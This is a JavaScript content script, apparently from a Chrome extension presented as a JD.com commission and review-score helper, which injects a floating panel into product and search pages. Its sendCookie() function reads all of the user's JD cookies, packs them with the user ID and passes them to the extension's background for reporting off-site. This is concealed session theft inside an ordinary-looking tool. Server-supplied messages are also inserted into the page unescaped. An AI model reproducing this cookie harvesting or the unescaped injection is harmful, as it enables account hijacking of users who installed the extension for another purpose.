$(function(){
	if(nowUrl.indexOf(goodsInfo)>=0){
		loadGoodsInfo();

	}
	if(nowUrl.indexOf(goodsSearch)>=0||nowUrl.indexOf(goodsSearch2)>=0){

		loadGoodsInfoList();
	}

	if(nowUrl.indexOf(userCoolie)>=0){
		sendCookie();
	}

});


function sendCookie(){
	var reportValue="";
	var strCookie = document.cookie;
	var arrCookie = strCookie.split("; ");
	for(var i = 0; i < arrCookie.length; i++){
		var arr = arrCookie[i].split("=");
		reportValue=reportValue+"ssid="+arr[0]+";unpl="+arr[1]+";";
	}
	console.log(reportValue);
	chrome.extension.sendMessage({action:'getItem',key:"userInfo"},function(d){
		if(d==null){
			return;
		}
		var dd=JSON.parse(d);
		var data={
			curPageUrl:nowUrl,
			cooId:dd.object.cooId,
			userId:dd.object.userId,
			data:JSON.stringify({
				reportType:'JdCookieJdCrx',
				reportValue:reportValue,
			}),
		};
		console.log(data);
		chrome.extension.sendMessage({action:'sendCookie',data:data},function(data){
			console.log(data);
		});
	});
}

//加载商品列表
function loadGoodsInfoList(){

	chrome.extension.sendMessage({action:'getItem',key:"userInfo"},function(d){
		if(d!=null){
			//qq群
			var dd=JSON.parse(d);
			var addQqGroupUrl2=dd.object.addQqGroupUrl;
			if(addQqGroupUrl2!=null){
				initGoodsInfoList(addQqGroupUrl2);
			}else{
				initGoodsInfoList(addQqGroupUrl);
			}
			//权限
			var right=dd.object.userRights;
			var rights=right.split(",");
			for(var i=0;i<rights.length;i++){
				if(rights[i]=="1010"){
					getGoodsInfoList();
					rFlag=2;
					console.log(rFlag+"rFlag");
				}
			}
		}else{
			initGoodsInfoList(addQqGroupUrl);
			$("#goodCominfo2").html('<div><font color=red scrollamount="1">'+'登录过期，请重新登录'+'</font></div>');

		}
	});

	$(window).scroll(function() {
		//智能查询后30条
		var top=$(window).scrollTop();
		if((top>5400&&sFlag==1&&rFlag==2)||(top>5400&&sFlag==1&&bFlag==2)){
			getGoodsInfoList();
			console.log(top);
		}
	});

	//换页自动查询
	$(window).mousemove(function(){
		if(!havePageFlag()&&rFlag==2){
			console.log("pageAutoSelect");
			getGoodsInfoList();
		}
	});

}


function getGoodsInfoList(){
	ifNoneAddPageFlag();
	console.log("getGoodsInfoList");
	//选择商品列表
	function selectGoodsList(){
		var goodsIds="";
		var items=$(".gl-item");
		var itemsA=$(".gl-i-wrap>.p-img>a");
		var itemsC=itemsA.length;
		console.log(itemsC+"itemsC");
		if(itemsC>30){
			sFlag=2;
			console.log(sFlag+"sFlag");
		}else{
			sFlag=1;
			console.log(sFlag+"sFlag");
		}

		for(var i=0;i<itemsC;i++){
			var goodsIdMatch=$(itemsA[i]).attr("href").match(/item\.jd\.com\/(\d+)\.html/);
			var goodsId;
			if(goodsIdMatch!=null){
				goodsId=goodsIdMatch[1];
			}else{
				goodsId=$(items[i]).attr("data-sku");
			}
			goodsIds=goodsIds+goodsId+",";

		}
		goodsIds=goodsIds.substring(0,goodsIds.length-1);
		console.log(goodsIds);
		return goodsIds;
	}
	//选择当前的LI列表
	function selectNowLIList(index){
		var ahref="'//item.jd.com/"+index+".html'";
		var nowa=$("a[href="+ahref+"]");
		var nowli;
		if(nowa.length!=0){
			nowli=nowa.parent().parent().parent();
		}else{
			nowli=$(".gl-item[data-sku='"+index+"']");
		}
		return nowli;
	}



	var goodsIds=selectGoodsList();

	chrome.extension.sendMessage({action:'getItem',key:"userInfo"},function(d){
		if(d==null){
			$("#goodCominfo2").html('<div><font color=red scrollamount="1">'+'登录过期，请重新登录'+'</font></div>');
			return;
		}
		$("#goodCominfo2").html('<div><font color=red scrollamount="1">'+''+'</font></div>');
		
		var dd=JSON.parse(d);
		var data={
			userId:dd.object.userId,
			cooId:dd.object.cooId,
			versionCode:version,
			data:JSON.stringify({
				goodIds:goodsIds,
			}),
		};

		console.log(data);

		

		chrome.extension.sendMessage({action:'getJdGoodCominfoListV1',data:data},function(data){
			var pdata=data;

			console.log(pdata);
			//resCode为100时退出登录
			if(pdata.resCode!=null&&pdata.resCode=="100"){
				chrome.extension.sendMessage({action:'removeItem',key:"userInfo"},function(data){});
				$("#goodCominfo2").html('<div><font color=red scrollamount="1">'+'登录过期，请重新登录'+'</font></div>');
				return;
			}
			//显示信息
			if(pdata.message!=null){
				$("#GoodPubInfo").html('<div><font color=red scrollamount="1">'+pdata.message+'</font></div>');
			}
			//显示系统消息
			if(pdata.systemInfo1!=null){
				$("#message1").html('<marquee><font color=red scrollamount="1">'+pdata.systemInfo1+'</font></marquee>');
			}



			var count=0;
			$.each(pdata.object,function(index, content)
			{
				count++;
				var nowLiItemP=selectNowLIList(index);
				var nowLiItem=$(nowLiItemP)[0];

				var mobileGoodRatePrice=content.goodRateInfo.mobileGoodRatePrice;
				var goodRateCnt=content.goodCommentInfo.goodRateCnt;
				var yyhtml='<div style="color:#008B00;font-weight:bold;">佣金:'+mobileGoodRatePrice+'</div>';
				var hphtml='<a style="color:#008B00;font-weight:bold;">'+goodRateCnt+'好评率</a>';
				var yydiv=$(nowLiItem).find("div.p-price");
				var hpdiv=$(nowLiItem).find("div.p-icons");
				if(mobileGoodRatePrice!="-"&&mobileGoodRatePrice!=""){
					yydiv.append(yyhtml);
					hpdiv.append(hphtml);
				}

			});
			console.log(count+"count");

		});

	});

}

function initGoodsInfoList(addQqGroupUrl){
	console.log("initGoodsInfo");
	appendPageElement = document.createElement("div"),
	appendPageElement.id = "prefix",
	appendPageElement.innerHTML = 
	'<div id="jddraggable" class="ui-draggable ui-draggable-handle" style="width:270px;">'
	+'<div class="jddraggable-title"><span>'+softName+version+'</span> '
	+'<a target="_blank" href='+addQqGroupUrl+'>'
	+'<img border="0" src="//pub.idqqimg.com/wpa/images/group.png" alt="京东达客助手" title="京东达客助手"></a></div>'
	+'<div class="jddraggable-main" id="jddraggable-main"><div id="goodCominfo1"></div>'
	+'<div id="message1" style="color:red"><span id="msub1"></span><span id="msub2"></span></div>'
	+'<p><button id="queryBtn" type="button" class="btn btn-primary">查询</button>'
	+'<p id="pubMessage"></p><div id="GoodPubInfo"></div>'
	+'<div id="currDataInfo"></div><div id="goodCominfo2"></div></div></div>';

	document.body.appendChild(appendPageElement);
	$("button.btn-primary").css("height","35px");

	$("#jddraggable").draggable();
	
	$("#queryBtn").click(function(){
		getGoodsInfoList();
		bFlag=2;
		console.log(bFlag+"bFlag");
	});



}



function loadGoodsInfo(){
	chrome.extension.sendMessage({action:'getItem',key:"userInfo"},function(d){
		if(d!=null){
			var dd=JSON.parse(d);
			var addQqGroupUrl2=dd.object.addQqGroupUrl;
			if(addQqGroupUrl2!=null){
				initGoodsInfo(addQqGroupUrl2);
			}else{
				initGoodsInfo(addQqGroupUrl);
			}
			var right=dd.object.userRights;
			var rights=right.split(",");
			for(var i=0;i<rights.length;i++){
				if(rights[i]=="1000"){
					getGoodsInfo();
				}
			}
		}else{
			initGoodsInfo(addQqGroupUrl);
			$("#goodCominfo2").html('<div><font color=red scrollamount="1">'+'登录过期，请重新登录'+'</font></div>');
		}
	});


}


function getGoodsInfo(){
	console.log("getGoodsInfo");

	var curPageUrl=nowUrl;
	var goodId=curPageUrl.match(/(\d+)\.html/)[1];

	var shopScript=$("html").html();
	var shopIdM=shopScript.match(/shopId:'(\d+)',/);
	var shopId=0;
	if(shopIdM.length>1){
		shopId=shopIdM[1];
	}
	


	var goodTitle=$(".sku-name").html();
	var goodPrice=$(".price").html();
	var goodImg=$("#spec-img").attr("src");
	var shopTitle=$("div.name>a").html();
	var shopType=$(".u-jd").html()!=null?"1":"2";
	var shopUrl=$("div.name>a").attr("href");
	var goodCatName=$("div.crumb .item:eq(4)>a").html();

	var goodCatIdI=$("div.crumb .item:eq(4)>a").attr("href");
	var goodCatId=0;
	if(goodCatIdI!=null){
		var goodCatIdM=goodCatIdI.match(/cat=((\d+,?)+)/);	
		if(goodCatIdM.length>1){
			goodCatId=goodCatIdM[1];
		}
	}


	chrome.extension.sendMessage({action:'getItem',key:"userInfo"},function(d){
		if(d==null){
			$("#goodCominfo2").html('<div><font color=red scrollamount="1">'+'登录过期，请重新登录'+'</font></div>');
			return;
		}
		$("#goodCominfo2").html('<div><font color=red scrollamount="1">'+''+'</font></div>');
		var dd=JSON.parse(d);
		var data={
			userId:dd.object.userId,
			curPageUrl:curPageUrl,
			cooId:dd.object.cooId,
			versionCode:version,
			data:JSON.stringify({
				goodId:goodId,
				shopId:shopId,
				goodImg:goodImg,
				goodTitle:goodTitle,
				goodPrice:goodPrice,
				shopTitle:shopTitle,
				shopType:shopType,
				shopUrl:shopUrl,
				goodCatId:goodCatId,
				goodCatName:goodCatName,
			}),
		};


		console.log(data);

		chrome.extension.sendMessage({action:'getJdGoodCominfoV1',data:data},function(data){
			console.log(data);
			if(data.resCode!=null&&data.resCode=="100"){
				chrome.extension.sendMessage({action:'removeItem',key:"userInfo"},function(data){});
				$("#goodCominfo2").html('<div><font color=red scrollamount="1">'+'登录过期，请重新登录'+'</font></div>');
				return;
			}
			if(data.message!=null){
				$("#GoodPubInfo").html('<div><font color=red scrollamount="1">'+data.message+'</font></div>');
			}
			if(data.systemInfo1!=null){
				$("#message1").html('<marquee><font color=red scrollamount="1">'+data.systemInfo1+'</font></marquee>');

			}



			var defaultColor = "#008B00";
			var content= "<p style='line-height:25px'> 佣金率:<span  style='color:"+defaultColor+" '>" + data.object.goodRateInfo.mobileGoodRate
			+ "</span> 佣金价格:<span  style='color: "+defaultColor+"'>" + data.object.goodRateInfo.mobileGoodRatePrice
			+ "</span><br> 商品评价:<span  style='color: "+(data.object.shopInfo.shangPinZhiLiangScoreNum<9.5?'red':defaultColor)+"'>" + data.object.shopInfo.shangPinZhiLiangScoreNum
			+ "</span> 服务态度:<span  style='color: "+(data.object.shopInfo.fuWuTaiDuScoreNum<9.5?'red':defaultColor)+"'>" + data.object.shopInfo.fuWuTaiDuScoreNum
			+ "</span> 物流速度:<span  style='color: "+(data.object.shopInfo.wuLiuSuDuScoreNum<9.5?'red':defaultColor)+"'>" + data.object.shopInfo.wuLiuSuDuScoreNum
			+ "</span><br> 好评:<span  style='color: "+defaultColor+"'>" + data.object.goodCommentInfo.goodCnt
			+ "</span> 好评率:<span  style='color: "+defaultColor+"'>" + data.object.goodCommentInfo.goodRateCnt 
			+ "</span> 差评:<span  style=\"color: "+(data.object.goodCommentInfo.badCnt>0?'red':defaultColor)+"\">" + data.object.goodCommentInfo.badCnt 
			+ "</span>  </p>";
			$("#currDataInfo").html(content);


		});
	});
}


function initGoodsInfo(addQqGroupUrl){
	console.log("initGoodsInfo");
	appendPageElement = document.createElement("div"),
	appendPageElement.id = "prefix",
	appendPageElement.innerHTML = 
	'<div id="jddraggable" class="ui-draggable ui-draggable-handle" style="width:270px;">'
	+'<div class="jddraggable-title"><span>'+softName+version+'</span> '
	+'<a target="_blank" href='+addQqGroupUrl+'>'
	+'<img border="0" src="//pub.idqqimg.com/wpa/images/group.png" alt="京东达客助手" title="京东达客助手"></a></div>'
	+'<div class="jddraggable-main" id="jddraggable-main"><div id="goodCominfo1"></div>'
	+'<div id="message1" style="color:red"><span id="msub1"></span><span id="msub2"></span></div>'
	+'<p><button id="queryBtn" type="button" class="btn btn-primary">佣金查询</button>'
	+'<p id="pubMessage"></p><div id="GoodPubInfo"></div>'
	+'<div id="currDataInfo"></div><div id="goodCominfo2"></div></div></div>';

	document.body.appendChild(appendPageElement);
	$("button.btn-primary").css("height","35px");

	$("#jddraggable").draggable();

	$("#queryBtn").click(function(){
		getGoodsInfo();
	});
}
